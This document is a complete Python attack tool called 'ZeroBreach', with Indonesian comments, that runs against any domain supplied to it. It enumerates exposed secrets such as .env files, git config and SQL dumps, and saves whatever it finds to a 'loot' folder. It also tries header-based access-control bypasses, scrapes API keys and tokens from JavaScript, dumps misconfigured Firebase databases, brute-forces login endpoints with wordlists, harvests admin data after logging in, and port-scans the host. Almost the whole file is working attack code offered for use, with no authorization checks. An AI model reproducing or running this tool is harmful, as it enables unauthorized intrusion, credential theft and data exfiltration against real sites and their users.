#!/usr/bin/env python3
"""
ZeroBreach — all-in-one recon + exploit + dump + brute
Input: domain / endpoint aplikasi. Output: data yang berhasil di-tarik.
"""

import argparse
import base64
import json
import os
import random
import re
import socket
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse, urljoin

import requests
import urllib3
from colorama import Fore, Style, init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)


G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
C = Fore.CYAN
W = Fore.WHITE
M = Fore.MAGENTA
RESET = Style.RESET_ALL
BOLD = Style.BRIGHT


BANNER = r"""
  ______  ______  ______  ______  ______  ______  ______  ______  ______  ______
 |  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  ||  __  |
 | |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | || |  | |
 | |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| || |__| |
 |______||______||______||______||______||______||______||______||______||______|
                                                                  zero breach
 
             >> ZeroBreach V1 <<
             recon → exploit → dump → brute
"""


UA_LIST = [
    "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
]


def log(kind, msg):
    tag = {
        "info": f"{C}[*]{RESET}",
        "ok":   f"{G}[+]{RESET}",
        "warn": f"{Y}[!]{RESET}",
        "err":  f"{R}[-]{RESET}",
        "crit": f"{M}[X]{RESET}",
        "dump": f"{G}{BOLD}[DUMP]{RESET}",
        "hit":  f"{G}{BOLD}[HIT]{RESET}",
    }[kind]
    print(f"{tag} {msg}")


def safe_name(s):
    return re.sub(r"[^a-zA-Z0-9._-]", "_", s)[:100]


def rnd_str(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def looks_like_data(text):
    t = text.strip().lower()
    if not t or len(t) < 20:
        return False
    if t.startswith(("{", "[")):
        return True
    if re.search(r"^[A-Z_]{3,}\s*=", text, re.M):
        return True
    if re.search(r"\[\d{4}-\d{2}-\d{2}", text):
        return True
    if re.search(r"(DB_PASSWORD|DB_USER|APP_KEY|SECRET|API_KEY|PRIVATE_KEY)", text):
        return True
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return True
    if "<!doctype html" in t or "<html" in t:
        if "login" in t or "password" in t:
            return False
        # HTML biasa, bukan data
        if "<body" in t and len(t) > 500:
            return False
    return False


def get_kind(text):
    t = text.strip()
    if t.startswith(("{", "[")):
        return "json"
    if re.search(r"^[A-Z_]{3,}\s*=", text, re.M):
        return "env"
    if re.search(r"\[\d{4}-\d{2}-\d{2}", text):
        return "log"
    if re.search(r"(INSERT INTO|CREATE TABLE)", text, re.I):
        return "sql"
    return "txt"


# ============================================================
# TARGET PATHS
# ============================================================
PATHS = [
    "/api/users", "/api/admin", "/api/config", "/api/settings",
    "/api/keys", "/api/token", "/api/me", "/api/profile",
    "/api/users/count", "/api/servers", "/api/nodes",
    "/api/application/users", "/api/application/servers",
    "/api/application/nodes", "/api/application/locations",
    "/api/application/nests", "/api/client/account",
    "/api/logs", "/api/db", "/api/database", "/api/backup",
    "/api/export", "/api/orders", "/api/transactions",
    "/api/files", "/api/upload", "/api/download",
    "/api/v1/users", "/api/v2/users", "/api/v1/config",
    "/.env", "/.env.local", "/.env.backup", "/.env.production",
    "/config.json", "/config.js", "/config.php", "/config.yaml",
    "/secrets.json", "/credentials.json", "/firebase.json",
    "/google-services.json", "/serviceAccount.json",
    "/.git/config", "/.git/HEAD", "/.gitignore",
    "/storage/logs/laravel.log", "/error.log", "/debug.log",
    "/phpinfo.php", "/info.php", "/test.php",
    "/db.sql", "/dump.sql", "/backup.sql", "/database.sql",
    "/backup.zip", "/backup.tar.gz",
    "/admin", "/admin/login", "/dashboard", "/phpmyadmin",
    "/pma", "/administrator", "/wp-admin",
    "/swagger.json", "/openapi.json", "/api-docs",
    "/graphql", "/graphiql",
]


BYPASS_HEADERS = [
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
]


LOGIN_PATHS = [
    "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/admin/login", "/api/v1/login",
    "/api/v1/auth/login", "/users/login",
]


# ============================================================
# CORE
# ============================================================
class ZeroBreach:
    def __init__(self, target, timeout=8, threads=20, outdir="loot",
                 verbose=False, users_file="users.txt",
                 wordlist_file="wordlist.txt"):
        self.target = target.rstrip("/")
        if not self.target.startswith(("http://", "https://")):
            self.target = "http://" + self.target
        self.timeout = timeout
        self.threads = threads
        self.outdir = outdir
        self.verbose = verbose
        os.makedirs(self.outdir, exist_ok=True)

        self.session = requests.Session()
        self.session.headers.update({"User-Agent": random.choice(UA_LIST)})

        self.hits = []
        self.loot = []
        self.users = self._load(users_file)
        self.wordlist = self._load(wordlist_file)
        self.found_creds = None

    def _load(self, path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                return [l.strip() for l in f if l.strip() and not l.startswith("#")]
        except FileNotFoundError:
            return []

    # ---------------- req helpers ----------------
    def _req(self, method, path, headers=None, data=None, json_data=None,
             allow_redirects=True):
        url = path if path.startswith("http") else self.target + path
        try:
            r = self.session.request(
                method=method, url=url, headers=headers,
                data=data, json=json_data,
                timeout=self.timeout, verify=False,
                allow_redirects=allow_redirects,
            )
            return r
        except Exception as e:
            if self.verbose:
                log("err", f"{method} {path} -> {e}")
            return None

    def get(self, p, **kw): return self._req("GET", p, **kw)
    def post(self, p, **kw): return self._req("POST", p, **kw)

    def _record(self, sev, name, detail):
        self.hits.append((sev, name, detail))
        icon = {
            "crit": f"{M}[CRIT]{RESET}",
            "high": f"{R}[HIGH]{RESET}",
            "med":  f"{Y}[MED]{RESET}",
            "info": f"{C}[INFO]{RESET}",
        }[sev]
        print(f"{icon} {name}")
        print(f"        {W}{detail}{RESET}")

    def _save(self, name, body):
        kind = get_kind(body)
        fname = f"{safe_name(name)}.{kind}"
        fpath = os.path.join(self.outdir, fname)
        with open(fpath, "w", encoding="utf-8", errors="ignore") as f:
            f.write(body)
        return fpath

    def _auto_dump(self, label, r):
        body = r.text
        if not looks_like_data(body):
            return False
        saved = self._save(label, body)
        kind = get_kind(body)
        size = len(body)
        log("dump", f"{label} [{kind}] {size}B -> {saved}")
        self.loot.append((label, kind, size, saved))
        self._record("crit", f"Dump: {label}", f"{kind} | {size}B | {saved}")
        print(f"        {W}{body[:200]}{RESET}")
        return True

    # ============================================================
    # STAGE 1 — FINGERPRINT
    # ============================================================
    def stage_fingerprint(self):
        print(f"\n{C}=== STAGE 1: FINGERPRINT ==={RESET}")
        r = self.get("/")
        if not r:
            log("err", "Target nggak respon.")
            return False
        log("ok", f"Target hidup: HTTP {r.status_code}")
        log("info", f"Server: {r.headers.get('Server', '?')}")
        log("info", f"X-Powered-By: {r.headers.get('X-Powered-By', '?')}")

        body = r.text.lower()
        tech = []
        for kw, name in [
            ("wp-content", "WordPress"), ("wp-includes", "WordPress"),
            ("laravel", "Laravel"), ("csrf-token", "Laravel"),
            ("_next", "Next.js"), ("react", "React"),
            ("vue", "Vue"), ("nuxt", "Nuxt"),
            ("pterodactyl", "Pterodactyl"), ("cloudflare", "Cloudflare"),
            ("firebase", "Firebase"), ("django", "Django"),
            ("rails", "Rails"), ("express", "Express"),
        ]:
            if kw in body:
                tech.append(name)
        if tech:
            log("ok", f"Tech: {', '.join(set(tech))}")
        return True

    # ============================================================
    # STAGE 2 — ENDPOINT ENUM + AUTO DUMP
    # ============================================================
    def stage_endpoints(self):
        print(f"\n{C}=== STAGE 2: ENDPOINT ENUM ({len(PATHS)} path) ==={RESET}")

        def _check(p):
            return p, self.get(p, allow_redirects=False)

        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futs = [ex.submit(_check, p) for p in PATHS]
            for f in as_completed(futs):
                res = f.result()
                if not res:
                    continue
                p, r = res
                if not r:
                    continue
                code = r.status_code

                if code == 200:
                    if not self._auto_dump(p, r):
                        if len(r.text) > 300:
                            self._record("med", f"Endpoint aktif: {p}",
                                         f"HTTP 200 | {len(r.text)}B")
                elif code == 401:
                    self._record("med", f"Butuh auth: {p}", "HTTP 401")
                elif code == 403:
                    pass
                elif code == 500:
                    self._record("high", f"Error 500: {p}", "potensi info leak")
                    if looks_like_data(r.text):
                        self._auto_dump(f"err{p}", r)

    # ============================================================
    # STAGE 3 — BYPASS
    # ============================================================
    def stage_bypass(self):
        print(f"\n{C}=== STAGE 3: HEADER BYPASS ==={RESET}")
        targets = ["/api/users", "/api/admin", "/api/config",
                   "/api/application/users", "/api/application/servers",
                   "/api/servers", "/api/keys"]
        for t in targets:
            base = self.get(t, allow_redirects=False)
            if base and base.status_code == 200:
                continue
            for h in BYPASS_HEADERS:
                r = self.get(t, headers=h, allow_redirects=False)
                if r and r.status_code == 200:
                    log("crit", f"Bypass tembus: {t} via {list(h.keys())[0]}")
                    self._record("crit", f"Header bypass: {t}",
                                 f"{list(h.keys())[0]}={list(h.values())[0]}")
                    self._auto_dump(f"bypass{t}", r)
                    break

    # ============================================================
    # STAGE 4 — JS MINING
    # ============================================================
    def stage_js(self):
        print(f"\n{C}=== STAGE 4: JS MINING ==={RESET}")
        r = self.get("/")
        if not r:
            return
        js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
        js_urls = [urljoin(self.target, u) for u in js_urls][:15]

        if not js_urls:
            log("info", "Nggak ada JS.")
            return

        cred_re = re.compile(
            r'(api[_-]?key|apikey|secret|token|bearer|auth|password)'
            r'["\']?\s*[:=]\s*["\']([^"\']{8,})["\']',
            re.I,
        )
        ep_re = re.compile(r'["\'](/api/[a-zA-Z0-9/_-]{2,})["\']')

        for js in js_urls:
            jr = self.get(js)
            if not jr or jr.status_code != 200:
                continue
            for m in cred_re.finditer(jr.text):
                k, v = m.group(1), m.group(2)
                if v.lower() in ("undefined", "null", "none", ""):
                    continue
                log("crit", f"Cred di JS: {k}={v[:60]}")
                self._record("crit", f"Credential di JS", f"{k}={v[:60]}")
                self._save(f"cred_{k}", f"{k}={v}")
            for ep in set(ep_re.findall(jr.text))[:20]:
                self._record("info", f"Endpoint di JS", ep)
                er = self.get(ep)
                if er and er.status_code == 200:
                    self._auto_dump(f"js{ep}", er)

    # ============================================================
    # STAGE 5 — FIREBASE
    # ============================================================
    def stage_firebase(self):
        print(f"\n{C}=== STAGE 5: FIREBASE CHECK ==={RESET}")
        r = self.get("/")
        if not r:
            return
        project = None
        for pat in [r'"projectId"\s*:\s*"([^"]+)"',
                    r'"databaseURL"\s*:\s*"https://([^.]+)\.']:
            m = re.search(pat, r.text)
            if m:
                project = m.group(1)
                break
        if not project:
            js_urls = re.findall(r'src=["\']([^"\']+\.js[^"\']*)["\']', r.text)
            for js in js_urls[:10]:
                jr = self.get(urljoin(self.target, js))
                if jr and jr.status_code == 200:
                    m = re.search(r'"projectId"\s*:\s*"([^"]+)"', jr.text)
                    if m:
                        project = m.group(1)
                        break
        if not project:
            log("info", "Nggak ketemu Firebase config.")
            return
        log("info", f"Firebase project: {project}")
        for u in [
            f"https://{project}.firebaseio.com/.json",
            f"https://{project}-default-rtdb.firebaseio.com/.json",
            f"https://firestore.googleapis.com/v1/projects/{project}/databases/(default)/documents",
        ]:
            try:
                rr = requests.get(u, timeout=self.timeout, verify=False)
                if rr.status_code == 200 and looks_like_data(rr.text):
                    log("crit", f"FIREBASE DUMP: {u}")
                    self._save(f"firebase_{project}", rr.text)
                    self._record("crit", "Firebase misconfig",
                                 f"{u} | {len(rr.text)}B")
            except Exception:
                pass

    # ============================================================
    # STAGE 6 — DEFAULT CRED + BRUTE
    # ============================================================
    def _try_login(self, path, user, pw):
        """Coba login di satu path, return response kalau sukses."""
        for key_u, key_p in [("email", "password"), ("username", "password"),
                             ("user", "pass"), ("login", "password")]:
            try:
                r = self.post(
                    path,
                    json_data={key_u: user, key_p: pw},
                    headers={"Content-Type": "application/json"},
                    allow_redirects=False,
                )
                if r and r.status_code in (200, 201, 302):
                    body = r.text.lower()
                    if any(k in body for k in ("token", "access_token", "jwt",
                                                "success", "welcome", "dashboard")):
                        return (user, pw, r.text[:1000])
            except Exception:
                pass
        return None

    def stage_creds(self):
        print(f"\n{C}=== STAGE 6: DEFAULT CRED + BRUTE ==={RESET}")
        if not self.users or not self.wordlist:
            log("warn", "users.txt / wordlist.txt kosong. Skip.")
            return

        log("info", f"Users: {len(self.users)} | Passwords: {len(self.wordlist)}")

        for lp in LOGIN_PATHS:
            # cek dulu endpoint ada
            r = self.post(lp, json_data={})
            if not r:
                continue
            if r.status_code == 404:
                continue
            log("info", f"Coba login di: {lp}")

            found = None
            counter = 0
            start = time.time()

            with ThreadPoolExecutor(max_workers=5) as ex:
                futs = {}
                for u in self.users:
                    for p in self.wordlist:
                        futs[ex.submit(self._try_login, lp, u, p)] = (u, p)

                for f in as_completed(futs):
                    counter += 1
                    if counter % 10 == 0:
                        el = time.time() - start
                        print(f"\r  {C}[*]{RESET} {counter}/{len(futs)} | {counter/el:.1f}/s", end="")
                    res = f.result()
                    if res:
                        found = res
                        print()
                        log("hit", f"LOGIN BERHASIL: {lp} | {res[0]}:{res[1]}")
                        self.found_creds = (lp, res[0], res[1])
                        self._record("crit", f"Login berhasil: {lp}",
                                     f"{res[0]}:{res[1]}")
                        self._save(f"login_{safe_name(lp)}", res[2])
                        for ff in futs:
                            ff.cancel()
                        break
            if found:
                break

        if self.found_creds:
            self._post_login_dump()

    def _post_login_dump(self):
        """Setelah login, coba akses semua endpoint admin pake session."""
        log("info", "Akses endpoint admin pake session...")
        for p in ["/api/users", "/api/admin/users", "/api/application/users",
                  "/api/servers", "/api/client/account", "/api/keys",
                  "/api/config", "/api/logs"]:
            r = self.get(p)
            if r and r.status_code == 200 and looks_like_data(r.text):
                self._auto_dump(f"postlogin{p}", r)

    # ============================================================
    # STAGE 7 — PORT SCAN
    # ============================================================
    def stage_ports(self):
        print(f"\n{C}=== STAGE 7: PORT SCAN ==={RESET}")
        host = urlparse(self.target).hostname
        if not host:
            return
        ports = {
            21: "FTP", 22: "SSH", 80: "HTTP", 443: "HTTPS",
            3306: "MySQL", 5432: "PostgreSQL", 6379: "Redis",
            8080: "Alt HTTP", 8443: "Alt HTTPS", 9200: "Elasticsearch",
            27017: "MongoDB",
        }
        for port, name in ports.items():
            try:
                s = socket.create_connection((host, port), timeout=3)
                s.close()
                sev = "info" if port in (80, 443) else "high"
                self._record(sev, f"Port terbuka: {port}", name)
            except Exception:
                pass

    # ============================================================
    # REPORT
    # ============================================================
    def report(self):
        print()
        print(f"{C}{'=' * 62}{RESET}")
        print(f"{C}{BOLD}  REPORT — {self.target}{RESET}")
        print(f"{C}{'=' * 62}{RESET}")

        counts = {"crit": 0, "high": 0, "med": 0, "info": 0}
        for s, _, _ in self.hits:
            counts[s] = counts.get(s, 0) + 1

        print(f"  {M}CRIT: {counts['crit']}{RESET}  "
              f"{R}HIGH: {counts['high']}{RESET}  "
              f"{Y}MED: {counts['med']}{RESET}  "
              f"{C}INFO: {counts['info']}{RESET}")
        print(f"  {G}Files dumped: {len(self.loot)}{RESET}\n")

        order = {"crit": 0, "high": 1, "med": 2, "info": 3}
        for sev, name, detail in sorted(self.hits, key=lambda x: order[x[0]]):
            icon = {
                "crit": f"{M}[CRIT]{RESET}",
                "high": f"{R}[HIGH]{RESET}",
                "med":  f"{Y}[MED]{RESET}",
                "info": f"{C}[INFO]{RESET}",
            }[sev]
            print(f"{icon} {name}")
            print(f"        {W}{detail}{RESET}")

        print()
        print(f"{G}[+] Loot: {self.outdir}/")
        print(f"{G}[+] Total file dumped: {len(self.loot)}")

        with open("zerobreach_report.json", "w") as f:
            json.dump({
                "target": self.target,
                "creds_found": self.found_creds,
                "hits": self.hits,
                "loot": [{"label": l, "kind": k, "size": s, "file": fp}
                         for l, k, s, fp in self.loot],
            }, f, indent=2)
        print(f"{G}[+] Report: zerobreach_report.json{RESET}")

    # ============================================================
    # RUN ALL
    # ============================================================
    def run(self):
        if not self.stage_fingerprint():
            return
        self.stage_endpoints()
        self.stage_bypass()
        self.stage_js()
        self.stage_firebase()
        self.stage_creds()
        self.stage_ports()
        self.report()


# ============================================================
# MAIN
# ============================================================
def main():
    p = argparse.ArgumentParser(
        description="ZeroBreach — all-in-one recon + exploit + dump + brute"
    )
    p.add_argument("target", help="Domain / endpoint target")
    p.add_argument("--timeout", type=int, default=8)
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--outdir", default="loot")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--users", default="users.txt")
    p.add_argument("--wordlist", default="wordlist.txt")

    args = p.parse_args()

    print(G + BOLD + BANNER + RESET)
    print(f"{C}Target  : {W}{args.target}{RESET}")
    print(f"{C}Outdir  : {W}{args.outdir}{RESET}")
    print(f"{C}Threads : {W}{args.threads}{RESET}\n")

    tool = ZeroBreach(
        args.target,
        timeout=args.timeout,
        threads=args.threads,
        outdir=args.outdir,
        verbose=args.verbose,
        users_file=args.users,
        wordlist_file=args.wordlist,
    )
    tool.run()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Y}[!] Interrupted.{RESET}")
        sys.exit(0)
